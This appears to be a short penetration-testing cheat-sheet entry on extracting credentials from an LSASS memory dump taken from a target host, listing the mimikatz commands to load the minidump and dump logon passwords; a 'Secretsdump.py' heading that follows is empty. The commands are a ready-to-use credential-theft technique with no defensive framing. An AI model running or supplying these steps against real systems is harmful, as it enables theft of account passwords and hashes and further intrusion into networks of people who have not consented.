# Extract credentials from LSASS dump

## Mimikatz

Following extracting a dump of LSASS.exe from the target host, use mimikatz to extract credentials offline.

```text
> mimikatz.exe #Open mimikatz
> sekurlsa::minidump {Path]\lsass.DMP #Set context to dump
> sekurlsa::logonpasswords #extract credentials
```

## Secretsdump.py



